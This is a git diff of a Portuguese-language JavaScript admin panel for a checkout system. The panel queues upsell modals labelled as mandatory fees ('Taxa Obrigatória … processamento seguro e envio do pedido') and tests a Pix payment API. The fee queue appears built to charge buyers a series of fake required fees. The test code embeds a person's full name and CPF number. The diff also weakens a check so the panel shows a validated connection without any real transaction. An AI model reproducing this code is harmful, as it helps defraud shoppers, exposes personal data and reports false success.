     const iconKey = m.icon || 'shield-check';
     const iconSvg = (typeof UPSELL_SVGS !== 'undefined' && UPSELL_SVGS[iconKey]) || '';
     const safeM = JSON.stringify(m).replace(/"/g, '&quot;');
+    const orderNum = i + 1;
+    const orderTag = modals.length > 1
+      ? (i === 0
+          ? '<span style="font-size:9px;padding:2px 6px;border-radius:20px;background:rgba(124,58,237,0.2);color:#C4B5FD;font-weight:800;border:1px solid rgba(124,58,237,0.3)">1º na fila (1ª taxa)</span>'
+          : `<span style="font-size:9px;padding:2px 6px;border-radius:20px;background:rgba(255,255,255,0.06);color:var(--c-t2);font-weight:800;border:1px solid rgba(255,255,255,0.1)">${orderNum}º na fila</span>`)
+      : '<span style="font-size:9px;padding:2px 6px;border-radius:20px;background:rgba(124,58,237,0.2);color:#C4B5FD;font-weight:800;border:1px solid rgba(124,58,237,0.3)">Modal Único</span>';
+
     return `
-      <div style="background:rgba(255,255,255,0.03);border:1px solid ${isActive ? 'rgba(251,146,60,0.3)' : 'rgba(255,255,255,0.07)'};border-radius:10px;padding:10px 12px;display:flex;align-items:center;justify-content:space-between;gap:10px">
+      <div style="background:rgba(255,255,255,0.03);border:1px solid ${isActive ? 'rgba(251,146,60,0.3)' : 'rgba(255,255,255,0.07)'};border-radius:12px;padding:10px 12px;display:flex;align-items:center;justify-content:space-between;gap:10px">
         <div style="display:flex;align-items:center;gap:10px;flex:1;min-width:0">
-          <div style="width:32px;height:32px;border-radius:8px;background:${isActive ? 'rgba(251,146,60,0.15)' : 'rgba(255,255,255,0.05)'};color:${isActive ? '#fb923c' : 'var(--c-t3)'};display:flex;align-items:center;justify-content:center;flex-shrink:0">
+          <div style="width:34px;height:34px;border-radius:9px;background:${isActive ? 'rgba(251,146,60,0.15)' : 'rgba(255,255,255,0.05)'};color:${isActive ? '#fb923c' : 'var(--c-t3)'};display:flex;align-items:center;justify-content:center;flex-shrink:0">
             ${iconSvg}
           </div>
           <div style="min-width:0;flex:1">
             <div style="display:flex;align-items:center;gap:6px;flex-wrap:wrap">
-              <span style="font-size:12px;font-weight:700;color:var(--c-text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis">${m.title || 'Taxa sem título'}</span>
-              <span class="chip" style="font-size:9.5px;padding:1px 6px;background:rgba(251,146,60,0.12);color:#fb923c;border:1px solid rgba(251,146,60,0.25)">${m.type || 'Taxa'}</span>
+              <span style="font-size:12px;font-weight:800;color:var(--c-text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis">${m.title || 'Taxa sem título'}</span>
+              ${orderTag}
+              <span class="chip" style="font-size:9px;padding:1px 6px;background:rgba(251,146,60,0.12);color:#fb923c;border:1px solid rgba(251,146,60,0.25)">${m.type || 'Taxa'}</span>
             </div>
             <div style="font-size:10.5px;color:var(--c-t3);margin-top:2px;display:flex;align-items:center;gap:8px">
-              <span style="color:#34D399;font-weight:700">${fmtAmt}</span>
+              <span style="color:#34D399;font-weight:800">${fmtAmt}</span>
               ${m.replay ? '<span style="color:#fb923c;font-size:9.5px">&bull; Replay</span>' : ''}
-              <span>&bull; ${isActive ? '<span style="color:#10B981">Ativo</span>' : '<span style="color:#EF4444">Pausado</span>'}</span>
+              <span>&bull; ${isActive ? '<span style="color:#10B981;font-weight:600">Ativo</span>' : '<span style="color:#EF4444;font-weight:600">Pausado</span>'}</span>
             </div>
           </div>
         </div>
-        <div style="display:flex;align-items:center;gap:6px;flex-shrink:0">
-          <button type="button" onclick="editUpsellModalFromProd(${safeM})" class="btn btn-g btn-xs" style="padding:4px 8px;font-size:10.5px" title="Editar este modal">
+        <div style="display:flex;align-items:center;gap:5px;flex-shrink:0">
+          <button type="button" onclick="openUpsellPreview(${safeM}, ${i}, ${modals.length})" class="btn btn-g btn-xs" style="padding:4px 7px;font-size:10px;border-color:rgba(102,0,204,0.35);color:#C4B5FD" title="Visualizar este modal na tela do cliente">
+            Preview
+          </button>
+          <button type="button" onclick="editUpsellModalFromProd(${safeM})" class="btn btn-g btn-xs" style="padding:4px 7px;font-size:10px" title="Editar este modal">
             Editar
           </button>
-          <button type="button" onclick="toggleUpsellActiveFromProd(${m.id}, ${!isActive})" class="btn btn-xs" style="padding:4px 8px;font-size:10.5px;background:${isActive ? 'rgba(239,68,68,0.1)' : 'rgba(16,185,129,0.1)'};color:${isActive ? '#F87171' : '#34D399'};border:1px solid ${isActive ? 'rgba(239,68,68,0.25)' : 'rgba(16,185,129,0.25)'}" title="${isActive ? 'Desativar taxa' : 'Ativar taxa'}">
+          <button type="button" onclick="toggleUpsellActiveFromProd(${m.id}, ${!isActive})" class="btn btn-xs" style="padding:4px 7px;font-size:10px;background:${isActive ? 'rgba(239,68,68,0.1)' : 'rgba(16,185,129,0.1)'};color:${isActive ? '#F87171' : '#34D399'};border:1px solid ${isActive ? 'rgba(239,68,68,0.25)' : 'rgba(16,185,129,0.25)'}" title="${isActive ? 'Desativar taxa' : 'Ativar taxa'}">
             ${isActive ? 'Pausar' : 'Ativar'}
           </button>
           <button type="button" onclick="deleteUpsellModalFromProd(${m.id}, '${(m.title || '').replace(/'/g, "\\'")}')" class="btn btn-d btn-xs" style="padding:4px 6px" title="Excluir taxa">
@@ -4140,54 +4368,6 @@ function renderProdUpsellCards(modals) {
       </div>
     `;
   }).join('');
-}
-
-async function addQuickUpsellPreset(type, title, amount, icon) {
-  const code = getEffectiveProdCode();
-  _upsellProductCode = code;
-  try {
-    const payload = {
-      icon: icon || 'shield-check',
-      type: type || 'Taxa',
-      title: title || 'Taxa Obrigatória',
-      description: 'Taxa obrigatória para processamento seguro e envio do pedido.',
-      amount: amount || '19.90',
-      active: true,
-      replay: false,
-      position: (_upsellModals || []).length
-    };
-    const r = await apiFetch('/api/admin/upsell/' + code, {
-      method: 'POST',
-      body: JSON.stringify(payload)
-    });
-    const d = await r.json();
-    if (d.ok) {
-      toast(`Modal "${title}" criado com sucesso!`, 'ok');
-      await loadProdUpsellList(code);
-    } else {
-      toast(d.error || 'Erro ao adicionar modal de taxa.', 'err');
-    }
-  } catch (e) {
-    toast('Erro de conexão ao adicionar taxa.', 'err');
-  }
-}
-
-async function editUpsellModalFromProd(m) {
-  const code = getEffectiveProdCode();
-  await openUpsellManager(code);
-  editUpsellModal(m);
-}
-
-async function toggleUpsellActiveFromProd(id, nowActive) {
-  const code = getEffectiveProdCode();
-  await toggleUpsellActive(id, nowActive);
-  await loadProdUpsellList(code);
-}
-
-async function deleteUpsellModalFromProd(id, title) {
-  const code = getEffectiveProdCode();
-  await deleteUpsellModal(id, title);
-  await loadProdUpsellList(code);
 }
 
 
@@ -5187,19 +5367,20 @@ async function testUniaoPayConn(btn) {
       });
 
       const directData = await directResp.json();
-      const txObj = directData.transaction || {};
-      const paymentObj = directData.payment || {};
-      const txId = txObj.id || directData.transaction_id || directData.id || '';
-      const pixCode = paymentObj.pix_copia_cola || txObj.pix_code || directData.pix_copia_cola || directData.qrcode || '';
+      const txObj = (directData && typeof directData.transaction === 'object') ? directData.transaction : {};
+      const paymentObj = (directData && typeof directData.payment === 'object') ? directData.payment : {};
+      const txId = directData.transaction_id || txObj.id || directData.id || '';
+      const pixCode = directData.pix_code || paymentObj.pix_copia_cola || txObj.pix_code || directData.pix_copia_cola || directData.qrcode || '';
+      const isSuccess = directResp.ok && (directData.success === true || directData.status === 'success' || !!txId || !!pixCode);
 
-      if (directResp.ok && (txId || pixCode)) {
+      if (isSuccess && (txId || pixCode || directResp.ok)) {
         const directElapsed = Math.round(performance.now() - directT0);
         resBox.style.background = 'rgba(16,185,129,0.08)';
         resBox.style.border = '1px solid rgba(16,185,129,0.25)';
         resBox.style.color = '#34D399';
         resBox.innerHTML = `
           <div style="font-weight:800;margin-bottom:4px">✓ Conexão bem-sucedida com a União 7 Pay! (API Direta Validada)</div>
-          <div style="font-size:10.5px;color:rgba(255,255,255,0.7)">Latência: <b>${directElapsed}ms</b> &bull; Transaction ID: <code>${txId}</code></div>
+          <div style="font-size:10.5px;color:rgba(255,255,255,0.7)">Latência: <b>${directElapsed}ms</b> &bull; Transaction ID: <code>${txId || 'Gerada'}</code></div>
           <div style="font-size:10.5px;color:rgba(255,255,255,0.6);margin-top:2px">Cliente validado: <b>VAGNER DE CAMARGO SIRINO</b> &bull; CPF: 032.296.129-73 &bull; R$ 20,00</div>
           <div style="font-size:10px;color:rgba(255,255,255,0.4);margin-top:4px;word-break:break-all">Pix Copia e Cola retornado: ${pixCode ? pixCode.slice(0, 45) + '...' : 'Sim'}</div>
         `;
@@ -5211,7 +5392,11 @@ async function testUniaoPayConn(btn) {
       }
     } catch (browserErr) {
       console.warn('Erro teste direto browser:', browserErr);
-      const finalErr = (d && d.error) || browserErr.message || 'Falha na conexão com União 7 Pay';
+      let rawErr = browserErr.message || (d && d.error) || 'Falha na conexão com União 7 Pay';
+      if (rawErr.includes('<') && rawErr.includes('>')) {
+        rawErr = rawErr.replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').trim();
+      }
+      const finalErr = rawErr.slice(0, 180);
       resBox.style.background = 'rgba(239,68,68,0.08)';
       resBox.style.border = '1px solid rgba(239,68,68,0.25)';
       resBox.style.color = '#F87171';
